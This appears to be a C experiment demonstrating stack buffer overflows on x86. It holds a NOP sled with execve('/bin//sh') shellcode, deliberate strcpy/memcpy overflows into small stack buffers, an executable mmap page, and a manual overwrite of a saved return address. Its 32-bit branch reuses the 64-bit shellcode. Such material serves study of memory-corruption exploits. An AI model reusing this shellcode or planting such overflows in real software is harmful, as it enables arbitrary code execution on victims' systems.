#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void fn5();

#ifdef __32_BIT
#define eip(jmp)                                                        \
   do {                                                                 \
      unsigned long a = 0;                                              \
      __asm__ ("\tcall "#jmp"\n"#jmp":\n""\tpop %%eax\n" : "=a" (a));   \
      printf("%%eip %08lx\n", a);                                      \
   } while (0)
#define esp(var, type)                                  \
   {  unsigned long a = 0;                              \
      __asm__ ("\tmov %%esp, %%eax\n" : "=a"(a) );      \
      printf("%%esp %08lx\n", a);                      \
      var = (type)a;                                    \
   }
#define ebp(var, type)                                  \
   {  unsigned long a = 0;                              \
      __asm__ ("\tmov %%ebp, %%eax\n" : "=a"(a) );      \
      printf("%%ebp %08lx\n", a);                      \
      var = (type)a;                                    \
   }
#define SIZE "%d"
#define HEX  "%08lx"
#else
#define eip(jmp)                                                        \
   do {                                                                 \
      unsigned long a = 0;                                              \
      __asm__ ("\tcall "#jmp"\n"#jmp":\n""\tpop %%rax\n" : "=a" (a));   \
      printf("%%rip %016lx\n", a);                                      \
   } while (0)
#define esp(var, type)                                  \
   {  unsigned long a = 0;                              \
      __asm__ ("\tmov %%rsp, %%rax\n" : "=a"(a) );      \
      printf("%%rsp %016lx\n", a);                      \
      var = (type)a;                                    \
   }
#define ebp(var, type)                                  \
   {  unsigned long a = 0;                              \
      __asm__ ("\tmov %%rbp, %%rax\n" : "=a"(a) );      \
      printf("%%rbp %016lx\n", a);                      \
      var = (type)a;                                    \
   }
#define SIZE "%ld"
#define HEX  "%016lx"
#endif

void fn(char *str)
{
   char buf[32] = {0};
   unsigned char *ptr[4];
   ptr[0] = (unsigned char *)buf;
   int ints[3] = {0};
   unsigned long longs[1] = {0};
   ptr[3] = mmap(0, 4096, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   esp(ptr[1], void *);
   ebp(ptr[2], void *);
   eip(next1);
   printf("%016lx %016lx %016lx, %016lx\n", (unsigned long)&str, (unsigned long)&buf[0],
          (unsigned long)&ptr[0], (unsigned long)&buf[32]);
   printf("mem: %016lx\n", (unsigned long)ptr[3]);
   ints[1] = (ptr[1] - ptr[2]) - 128;
   printf("%d\n", ints[1]);
   for (ints[0] = 32; ints[0] > ints[1]; ints[0]--) {
      printf("%02x", ptr[2][ints[0]-1]);
      if ((255+ints[0]) % 32 == 0)
         printf("\n");
      else if ((255+ints[0]) % 8 == 0)
         printf("   ");
      else if ((255+ints[0]) % 4 == 0)
         printf(" ");
   }
   while (*str && *str != ' ') {
      *ptr[0]++ = *str++;
      if ((ptr[0] - (unsigned char *)buf) < ints[2]) {
         printf("%d "SIZE"\n", ints[2], (ptr[0] - (unsigned char *)buf));
      }
      ints[2]++;
   }
   strcpy(ptr[3], str);
   printf("%016lx\n", *(unsigned long *)&ptr[2]);
   printf("%016lx\n", *(unsigned long *)&ptr[2][-8]);
   printf("%016lx\n", *(unsigned long *)&ptr[2][8]);
   *(unsigned long *)(buf + 0x78) = (unsigned long)ptr[3];
   *(unsigned long *)(buf + 0x78) = (unsigned long)fn5;
   printf("\n");
   for (ints[0] = 0; buf[ints[0]]; ints[0]++) {
      printf("%02x", (unsigned char)buf[ints[0]]);
      if ((1+ints[0]) % 32 == 0)
         printf("\n");
      else if ((1+ints[0]) % 8 == 0)
         printf("   ");
      else if ((1+ints[0]) % 4 == 0)
         printf(" ");
   }
   printf("\n\n");

   for (ints[0] = 32; ints[0] > ints[1]; ints[0]--) {
      printf("%02x", ptr[2][ints[0]-1]);
      if ((255+ints[0]) % 32 == 0)
         printf("\n");
      else if ((255+ints[0]) % 8 == 0)
         printf("   ");
      else if ((255+ints[0]) % 4 == 0)
         printf(" ");
   }
   printf("\n");
}

void fn32(char *str)
{
   char buf[32] = {0};
   char *cp = buf;
   int i, len, count;
   
   for (i = 0; str[i]; i++) {
      printf("%02x", (unsigned char)str[i]);
      if ((1+i) % 32 == 0)
         printf("\n");
      else if ((1+i) % 8 == 0)
         printf("   ");
      else if ((1+i) % 4 == 0)
         printf(" ");
   }
   printf("\n\n");

   strcpy(cp, str);

   for (i = 0; buf[i]; i++) {
      printf("%02x", (unsigned char)buf[i]);
      if ((1+i) % 32 == 0)
         printf("\n");
      else if ((1+i) % 8 == 0)
         printf("   ");
      else if ((1+i) % 4 == 0)
         printf(" ");
   }
   printf("\n\n");
}

void fn2(char *str)
{
   char buf[32] = {0};
   char *cp;
   esp(cp, void *);
   memcpy(buf, str, strlen(str));
   for (cp = buf; *cp; cp++) {
      printf("%02x", (unsigned char)*cp);
      if (((unsigned long)cp + 1) % 16 == 0) {
         printf("\n");
      } else if (((unsigned long)cp + 1) % 8 == 0) {
         printf("   ");
      } else if (((unsigned long)cp + 1) % 4 == 0) {
         printf(" ");
      }
   }
   printf("\n");
   printf("%016lx\n", *(unsigned long *)&buf[40]);
}

void fn3(char *str)
{
   char buf = {0};
   char *cp;
   esp(cp, void *);
   memcpy(&buf, str, strlen(str));
   for (cp = &buf; *cp; cp++) {
      printf("%02x", (unsigned char)*cp);
      if (((unsigned long)cp + 1) % 16 == 0) {
         printf("\n");
      } else if (((unsigned long)cp + 1) % 8 == 0) {
         printf("   ");
      } else if (((unsigned long)cp + 1) % 4 == 0) {
         printf(" ");
      }
   }
   printf("\n");
   printf("%016lx\n", *(unsigned long *)&buf);
}

#ifdef __32_BIT
static char str[] = 
   "\x90\x90\x90\x90""\x90\x90\x90\x90"  "\x90\x90\x90\x90""\x90\x90\x90\x90"
   "\x90\x90\x90\x90""\x90\x90\x90\x90"  "\x90\x90\x90\x90""\x90\x90\x90\x90"
   "\x48\x31\xc0\x48""\x31\xd2\x48\x31"  "\xf6\x52\x48\xbf""\x2f\x62\x69\x6e"
   "\x2f\x2f\x73\x68""\x57\x48\x89\xe7"  "\xb0\x3b\x0f\x05"
   "AAAAAAAAAAAAAAAA";
#else
static char str[] = 
   "\x90\x90\x90\x90""\x90\x90\x90\x90"  "\x90\x90\x90\x90""\x90\x90\x90\x90"
   "\x90\x90\x90\x90""\x90\x90\x90\x90"  "\x90\x90\x90\x90""\x90\x90\x90\x90"
   "\x48\x31\xc0\x48""\x31\xd2\x48\x31"  "\xf6\x52\x48\xbf""\x2f\x62\x69\x6e"
   "\x2f\x2f\x73\x68""\x57\x48\x89\xe7"  "\xb0\x3b\x0f\x05"
   "AAAAAAAAAAAAAAAA";
#endif


int main(int argc, char *argv[])
{
   printf("main "HEX"\tfn "HEX"\n", (unsigned long)main, (unsigned long)fn);
   switch(argc) {
   case 1:
      eip(next2);
#ifdef __32_BIT
      fn32(str);
#else
      fn(str);
#endif
      break;
   case 2:
      fn2(str);
      break;
   case 3:
      fn3(str);
      break;
   default:
      fn(str);
      fn2(str);
   }      
   return 0;
}

void fn5()
{
   printf("sdflkj\n");
   exit(-123);
}
